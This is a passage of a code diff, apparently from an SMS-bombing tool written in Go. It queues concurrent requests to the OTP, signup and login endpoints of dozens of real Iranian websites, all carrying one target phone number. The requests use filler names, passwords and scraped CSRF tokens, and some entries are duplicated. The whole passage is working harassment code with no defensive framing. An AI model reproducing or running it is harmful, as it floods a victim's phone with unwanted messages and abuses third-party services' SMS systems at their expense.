+		}(client)
+
+		//masterkala.com 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				serviceURL := "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp"
+				payload := map[string]interface{}{
+					"type": "sendotp",
+					"phone": phone,
+				}
+				sendJSONRequest(c, ctx, serviceURL, payload, &wg, ch)
+			}
+		}(client)
+  // naabshop.com 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("login_digt_countrycode", "+98")
+				formData.Set("digits_phone", formatPhoneWithSpaces(phone)) 
+				formData.Set("action_type", "phone")
+				formData.Set("digits_reg_name", "testname") 
+				formData.Set("digits_reg_lastname", "testlastname") 
+				formData.Set("digits_process_register", "1")
+				formData.Set("sms_otp", "")
+				formData.Set("otp_step_1", "1")
+				formData.Set("signup_otp_mode", "1")
+				formData.Set("rememberme", "1")
+				formData.Set("digits", "1")
+				formData.Set("instance_id", "27744fbc0c69e6e612567dd63636fde4") 
+				formData.Set("action", "digits_forms_ajax")
+				formData.Set("type", "login")
+				formData.Set("digits_step_1_type", "")
+				formData.Set("digits_step_1_value", "")
+				formData.Set("digits_step_2_type", "")
+				formData.Set("digits_step_2_value", "")
+				formData.Set("digits_step_3_type", "")
+				formData.Set("digits_step_3_value", "")
+				formData.Set("digits_login_email_token", "")
+				formData.Set("digits_redirect_page", "//naabshop.com/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") 
+				formData.Set("digits_form", "28e10ee7bd")
+				formData.Set("_wp_http_referer", "/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") 
+				formData.Set("show_force_title", "1")
+				formData.Set("container", "digits_protected")
+				formData.Set("sub_action", "sms_otp")
+
+				sendFormRequest(c, ctx, "https://naabshop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+                //operator-100.ir
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("email", phone)
+				sendFormRequest(c, ctx, "https://operator-100.ir/api/customer/member/register/", formData, &wg, ch)
+			}
+		}(client)
+
+		// see5.net (Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("mobile", phone)
+				formData.Set("name", "sfsfsfsffsf")
+				formData.Set("demo", "bz_sh_fzltprxh")
+				sendFormRequest(c, ctx, "https://see5.net/wp-content/themes/see5/webservice_demo2.php", formData, &wg, ch)
+			}
+		}(client) 
+
+		// itmall.ir (Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "digits_check_mob")
+				formData.Set("countrycode", "+98")
+				formData.Set("mobileNo", phone)
+				formData.Set("csrf", "e57d035242")
+				formData.Set("login", "2")
+				formData.Set("username", "")
+				formData.Set("email", "")
+				formData.Set("captcha", "")
+				formData.Set("captcha_ses", "")
+				formData.Set("json", "1")
+				formData.Set("whatsapp", "0")
+				sendFormRequest(c, ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
+			}
+		}(client) 
+
+		// virgool.io (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
+					"method":     "phone",
+					"identifier": phone,
+				}, &wg, ch)
+			}
+		}(client) 
+
+		// virgool.io (JSON) 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://virgool.io/api/v1.4/auth/user-existence", map[string]interface{}{ 
+					"username": phone,
+				}, &wg, ch)
+			}
+		}(client)
+
+		// virgool.io (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{ 
+					"identifier": phone,
+				}, &wg, ch)
+			}
+		}(client)
+
+		// Mobinnet (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": phone}, &wg, ch) 
+			}
+		}(client)
+
+		// api.ostadkr.com (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				sendJSONRequest(c, ctx, "https://api.ostadkr.com/login", map[string]interface{}{ 
+					"mobile": phone,
+				}, &wg, ch)
+			}
+		}(client) 
+
+		// see5.net (Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("mobile", phone)
+				formData.Set("name", "sfsfsfsffsf")
+				formData.Set("demo", "bz_sh_fzltprxh")
+				sendFormRequest(c, ctx, "https://see5.net/wp-content/themes/see5/webservice_demo2.php", formData, &wg, ch)
+			}
+		}(client) 
+
+		// itmall.ir (Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "digits_check_mob")
+				formData.Set("countrycode", "+98")
+				formData.Set("mobileNo", phone)
+				formData.Set("csrf", "e57d035242")
+				formData.Set("login", "2")
+				formData.Set("username", "")
+				formData.Set("email", "")
+				formData.Set("captcha", "")
+				formData.Set("captcha_ses", "")
+				formData.Set("json", "1")
+				formData.Set("whatsapp", "0")
+				sendFormRequest(c, ctx, "https://itmall.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
+			}
+		}(client) 
+
+		// iranicard.ir (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://api.iranicard.ir/api/v1/register", map[string]interface{}{ 
+					"mobile": phone,
+				}, &wg, ch)
+			}
+		}(client)
+
+		// miare.ir (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				sendJSONRequest(c, ctx, "https://www.miare.ir/api/otp/driver/request/", map[string]interface{}{ 
+					"phone_number": phone,
+				}, &wg, ch)
+			}
+		}(client)
+
+		// pezeshket.com (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://api.pezeshket.com/core/v1/auth/requestCodeByMobile", map[string]interface{}{
+					"mobileNumber": phone,
+				}, &wg, ch)
+			}
+		}(client)
+
+		// bitycle.com (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://api.bitycle.com/api/account/register", map[string]interface{}{
+					"phone": phone,
+				}, &wg, ch)
+			}
+		}(client)
+
+		// caropex.com (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				sendJSONRequest(c, ctx, "https://caropex.com/api/v1/user/login", map[string]interface{}{ 
+					"mobile": phone,
+				}, &wg, ch)
+			}
+		}(client)
+
+		// platform-api.snapptrip.com 
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://platform-api.snapptrip.com/profile/auth/request-otp", map[string]interface{}{
+					"phoneNumber": phone,
+				}, &wg, ch)
+			}
+		}(client) 
+
+		// bigtoys.ir - Variation 3 (Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("action_type", "phone")
+				formData.Set("digt_countrycode", "+98")
+				formData.Set("phone", strings.TrimPrefix(phone, "0"))
+				formData.Set("email", "")
+				formData.Set("digits_reg_name", "abcdefghl")
+				formData.Set("digits_reg_password", "qzF8w7UAZusAJdg")
+				formData.Set("digits_process_register", "1")
+				formData.Set("optional_email", "")
+				formData.Set("is_digits_optional_data", "1")
+				formData.Set("sms_otp", "")
+				formData.Set("otp_step_1", "1")
+				formData.Set("signup_otp_mode", "1")
+				formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222")
+				formData.Set("optional_data", "email")
+				formData.Set("action", "digits_forms_ajax")
+				formData.Set("type", "register")
+				formData.Set("dig_otp", "")
+				formData.Set("digits", "1")
+				formData.Set("digits_redirect_page", "//www.bigtoys.ir/")
+				formData.Set("digits_form", "3bed3c0f10")
+				formData.Set("_wp_http_referer", "/")
+				formData.Set("container", "digits_protected")
+				formData.Set("sub_action", "sms_otp")
+				sendFormRequest(c, ctx, "https://www.bigtoys.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
+			}
+		}(client) 
+
+		// pgemshop.com (POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "digits_check_mob")
+				formData.Set("countrycode", "+98")
+				formData.Set("mobileNo", phone)
+				formData.Set("csrf", "0a60a620d9")
+				formData.Set("login", "2")
+				formData.Set("username", "")
+				formData.Set("email", "")
+				formData.Set("captcha", "")
+				formData.Set("captcha_ses", "")
+				formData.Set("json", "1")
+				formData.Set("whatsapp", "0")
+				sendFormRequest(c, ctx, "https://pgemshop.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
+			}
+		}(client) 
+
+		// api.cafebazaar.ir (POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				payload := map[string]interface{}{
+					"properties": map[string]interface{}{
+						"language":      2,
+						"clientID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx",
+						"clientVersion": "web",
+						"deviceID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx",
+					},
+					"singleRequest": map[string]interface{}{
+						"getOtpTokenRequest": map[string]interface{}{
+							"username": getPhoneNumber98NoZero(phone),
+						},
+					},
+				}
+				sendJSONRequest(c, ctx, "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", payload, &wg, ch) 
+			}
+		}(client) 
+
+		// https://www.irantic.com/api/login/authenticate (JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				sendJSONRequest(c, ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{ 
+					"mobile": phone,
+				}, &wg, ch)
+			}
+		}(client) 
+
+		// https://pirankalaco.ir/SendPhone.php (Form Data)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("phone", phone)
+				sendFormRequest(c, ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch) 
+			}
+		}(client) 
+
+		// https://refahtea.ir/wp-admin/admin-ajax.php (Form Data)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "refah_send_code")
+				formData.Set("mobile", phone)
+				formData.Set("security", "placeholder")
+
+				sendFormRequest(c, ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
+			}
+		}(client) 
+
+		// ubike.ir (SMS - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "logini_first")
+				formData.Set("login", phone)
+				sendFormRequest(c, ctx, "https://ubike.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
+			}
+		}(client) 
+
+		// www.kanoonbook.ir (SMS - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("task", "customer_phone")
+				formData.Set("customer_username", phone)
+				sendFormRequest(c, ctx, "https://www.kanoonbook.ir/store/customer_otp", formData, &wg, ch) 
+			}
+		}(client)
+
+		// zzzagros.com (SMS - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "awsa-login-with-phone-send-code")
+				formData.Set("nonce", "9a4e9547c3")
+				formData.Set("username", phone)
+				sendFormRequest(c, ctx, "https://www.zzzagros.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
+			}
+		}(client) 
+
+		// gitamehr.ir (SMS - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "mreeir_send_sms")
+				formData.Set("mobileemail", phone)
+				formData.Set("userisnotauser", "")
+				formData.Set("type", "mobile")
+				formData.Set("captcha", "")
+				formData.Set("captchahash", "")
+				formData.Set("security", "75d313bc3e")
+				sendFormRequest(c, ctx, "https://gitamehr.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
+			}
+		}(client) 
+
+		// 4hair.ir (SMS - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "mreeir_send_sms")
+				formData.Set("mobileemail", phone)
+				formData.Set("userisnotauser", "")
+				formData.Set("type", "mobile")
+				formData.Set("captcha", "")
+				formData.Set("captchahash", "")
+				formData.Set("security", "52771e6d1a")
+				sendFormRequest(c, ctx, "https://4hair.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
+			}
+		}(client) 
+
+		// account724.com (SMS - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "stm_login_register")
+				formData.Set("type", "mobile")
+				formData.Set("input", phone)
+				sendFormRequest(c, ctx, "https://account724.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
+			}
+		}(client) 
+
+		// api-atlasmode.alochand.com (SMS - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("version", "new2")
+				formData.Set("mobile", phone)
+				formData.Set("sdlkjcvisl", "uikjdknfs")
+				sendFormRequest(c, ctx, "https://api-atlasmode.alochand.com/v1/customer/register-login?version=new2", formData, &wg, ch) // ارسال c
+			}
+		}(client)
+		// api.pashikshoes.com (SMS - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("mobile", phone)
+				formData.Set("sdlkjcvisl", "uikjdknfs")
+				sendFormRequest(c, ctx, "https://api.pashikshoes.com/v1/customer/register-login", formData, &wg, ch) 
+			}
+		}(client)
+
+		// api.paaakar.com (SMS - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("version", "new1")
+				formData.Set("mobile", phone)
+				formData.Set("sdlkjcvisl", "uikjdknfs")
+				sendFormRequest(c, ctx, "https://api.paaakar.com/v1/customer/register-login?version=new1", formData, &wg, ch) 
+			}
+		}(client)
+
+		// queenaccessories.ir (SMS - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				payload := map[string]interface{}{
+					"mobile_phone": phone,
+				}
+				sendJSONRequest(c, ctx, "https://queenaccessories.ir/api/v1/sessions/login_request", payload, &wg, ch) // ارسال c
+			}
+		}(client) 
+
+		// techsiro.com (SMS - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("client", "web")
+				formData.Set("method", "POST")
+				formData.Set("_token", "")
+				formData.Set("mobile", phone)
+				sendFormRequest(c, ctx, "https://techsiro.com/send-otp", formData, &wg, ch) 
+			}
+		}(client) 
+
+		// shimashoes.com (Registration - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("email", phone)
+				sendFormRequest(c, ctx, "https://shimashoes.com/api/customer/member/register/", formData, &wg, ch) // ارسال c
+			}
+		}(client) 
+
+		// microele.com (Registration - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() { 
+			return func() {
+				formData := url.Values{}
+				formData.Set("id_customer", "")
+				formData.Set("back", ",my-account")
+				formData.Set("firstname", "123")
+				formData.Set("lastname", "123")
+				formData.Set("password", "123456")
+				formData.Set("action", "register")
+				formData.Set("username", phone)
+				formData.Set("ajax", "1")
+				sendFormRequest(c, ctx, "https://www.microele.com/login?back=my-account", formData, &wg, ch) // ارسال c
+			}
+		}(client) 
+		// api.123kif.com Register (Registration/OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobile": phone, 
+					"password": "testpassword123", 
+					"firstName": "Test", 
+					"lastName": "User", 
+					"platform": "web", 
+					"refferCode": "", 
+				}
+				sendJSONRequest(c, ctx, "https://api.123kif.com/api/auth/Register", payload, &wg, ch)
+			}
+		}(client)
+
+
+
 
 	}
 
